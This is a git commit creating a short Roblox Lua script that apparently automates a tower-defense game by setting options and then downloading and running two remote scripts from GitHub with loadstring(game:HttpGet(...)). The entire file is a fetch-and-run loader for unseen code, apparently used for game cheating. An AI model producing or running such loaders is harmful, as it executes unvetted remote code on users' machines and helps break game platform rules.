dfc07d858ea2693f7083801be62539a57194a350
Hobeogithub <158523582+Hobeogithub@users.noreply.github.com>
2024-03-21 00:10:35 +0700

    Create toilet1.1.lua

---
+++ toilet1.1.lua
@@ -0,0 +1,5 @@
+_G.AutoVote = true 
+_G.Difficulty = "Nightmare" -- "Easy" / "Medium" / "Hard" / "Nightmare" 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CodexHubX/e32cqvvx3dz486221wwdac/main/TTDAutoVote.lua"))()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Xenon-Trash/Loader/main/Loader.lua')){266159023653}
